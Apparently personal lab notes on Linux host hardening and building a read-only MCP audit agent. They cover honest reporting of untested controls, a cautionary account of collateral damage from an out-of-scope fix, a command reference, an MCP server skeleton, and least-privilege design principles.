- **Label untested controls honestly.** The hardened sshd_config was syntax-validated but is not operational in this environment. Claiming an untested control works is the credibility gap to avoid.
- **A 100% score on a checklist you wrote yourself is weak evidence.** It measures "does this host pass the tests I chose," not "is this host secure." A client should ask who picked the checks. State which checks genuinely flipped FAIL to PASS versus which were already true of the base image.
- **Backgrounded processes do not survive their parent shell** — the Python backends died and nginx returned 502. This is why services belong in systemd units (Day 3).
- **BLAST RADIUS — the day's most valuable lesson.** Chasing an out-of-scope finding (a port owned by another WSL instance) onto a machine outside the lab caused real collateral damage: `apt purge openssh-client` cascaded into removing snapd, ssh-import-id, xauth, fuse3, squashfs-tools and left dpkg in a permanently failing state. **The correct response to an out-of-scope finding is to document it, not to chase it onto a system you depend on.** This is precisely how production incidents happen.

---

## MCP / agents (added Day 12)

| Command | What it does | When you reach for it |
|---|---|---|
| `python3 -m venv .venv` | Create an isolated Python environment | Always, before pip installing anything |
| `source .venv/bin/activate` | Enter the venv (prompt shows `(.venv)`) | Before every pip/python call for that project |
| `pip install "mcp[cli]>=1.27,<2"` | Install the MCP SDK, **version-pinned** | An unpinned major bump silently breaks code |
| `pip show mcp` | Confirm what actually installed | `mcp.__version__` does not exist |
| `claude mcp add NAME -- /abs/python /abs/server.py` | Register a stdio MCP server | Wiring an agent into Claude Code |
| `claude mcp list` | Show registered servers and connection status | Verifying the wiring |
| `ps -ef \| grep "[s]erver.py"` | See whether the server process exists | Proving stdio servers only run during a session |
| `cat ~/.claude.json` | Where MCP registrations are stored | Inspecting or removing a registration |
| `sudo visudo -c -f /etc/sudoers.d/FILE` | Validate a sudoers drop-in | Always, before trusting it |

**MCP server skeleton (SDK v1.x):**

```
from mcp.server.fastmcp import FastMCP
from pydantic import BaseModel

mcp = FastMCP("name")

@mcp.tool()
def my_tool() -> SomeModel:
    """Docstring the MODEL reads to decide whether to call this."""
    ...

if __name__ == "__main__":
    mcp.run()          # stdio transport
```

Pydantic return models generate the JSON schema automatically. The docstring **is** the interface contract.

## Day 12 — Agent 1: MCP Server Health Monitor

- **An MCP server is a file, not a daemon.** It is inert on disk until a client launches it as a child process and speaks JSON-RPC over stdin/stdout. No port, no listening socket, lifetime equals the session. Verified with `ps` before, during and after a session.
- **stdio transport is the safest default** — a server that is not listening on anything cannot be reached by anyone. HTTP transport opens a port and raises "who else can reach it?"
- **Tool-surface design is least privilege.** `run_command` is a shell and must never exist. `fix_finding` is a **write** capability and belongs behind human approval — read and write are separate grants. Only `run_audit` (read-only, no arguments) belongs in v1.
- **No steerable arguments.** A free-form path or check name reaching a shell script is command injection. If filtering is needed, validate against a hardcoded allowlist.
- **THE ARCHITECTURAL PRINCIPLE:** evidence is generated by deterministic tooling and interpreted by a model — **never the reverse**. Nothing about host state should be invented; only prioritisation and impact are reasoned.
- **Three-layer split:** root-owned bash observer (what to look at) + scoped sudoers rule (the privilege boundary) + unprivileged Python interpreter (what it means). The part needing root is the smallest possible, immutable, and read-only.
- **The safety of a NOPASSWD grant depends on the target being immutable to the grantee.** `root:root 755` means execute-but-not-modify. A root-executed script writable by a non-root user is always a finding.
- **Keep the tool's raw output dumb.** Opaque IDs from bash; all meaning (CIS item, severity, rationale, remediation) attached from a dict in Python source. A compromised script then cannot inject a false rationale or downgrade a severity.
- **`subprocess.run([...])` list form, never `shell=True`** — arguments go straight to `execve`, so no shell parses them.
- **Encode scope humility in the data structure** (`scope_note`), so the model cannot omit it.
- **PEP 668:** Debian/Ubuntu refuse system-wide pip installs because pip and apt both manage `/usr/lib/python3`. A venv is the sanctioned path. `python3-venv` is a separate apt package.
- **Suppressing command output hides failures** — an `apt install ... 2>/dev/null >/dev/null` concealed a failing post-install and left dpkg stuck for days.